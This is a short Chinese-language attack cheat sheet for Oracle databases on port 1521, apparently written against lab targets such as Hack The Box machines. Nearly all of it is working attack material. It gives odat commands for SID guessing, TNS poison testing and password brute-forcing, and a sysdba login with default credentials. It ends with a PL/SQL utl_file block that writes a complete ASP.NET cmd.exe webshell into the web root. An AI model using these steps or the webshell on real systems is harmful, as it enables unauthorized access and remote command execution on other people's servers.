# 1521（Oracle）

1. 通常用来登陆后写入webshell

```bash
使用odat工具
1. 枚举id
odat sidguesser -s 10.129.7.193
2. 查看是否可打
odat tnspoison -s 10.10.10.82 -d XE --test-module
xe是刚才枚举出的id
3. 爆破密码
odat passwordguesser -d XE -s 10.129.7.193 -p 1521 --accounts-file  /usr/share/odat/accounts/accounts.txt
4. 登陆枚举
sqlplus scott/tiger@10.10.10.82:1521/XE as sysdba
5. 写入webshell/payload（peng.aspx）
--------------------------------------
declare
    f utl_file.file_type;
    s varchar(5000) := '<%@ Page Language="C#" Debug="true" Trace="false" %><%@ Import Namespace="System.Diagnostics" %><%@ Import Namespace="System.IO" %><script Language="c#" runat="server">void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = "cmd.exe";psi.Arguments = "/c "+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write("<pre>");Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write("</pre>");}</script><HTML><body ><form id="cmd" method="post" runat="server"><asp:TextBox id="txtArg" runat="server" Width="250px"></asp:TextBox><asp:Button id="testing" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button><asp:Label id="lblText" runat="server">Command:</asp:Label></form></body></HTML>';
begin
    f:= utl_file.fopen('/inetpub/wwwroot', 'peng.aspx', 'W');
    utl_file.put_line(f,s);
    utl_file.fclose(f);
end;
/
------------------------------------------
6. 然后url直接访问10.10.10.82/peng.aspx即可获取webshell
```
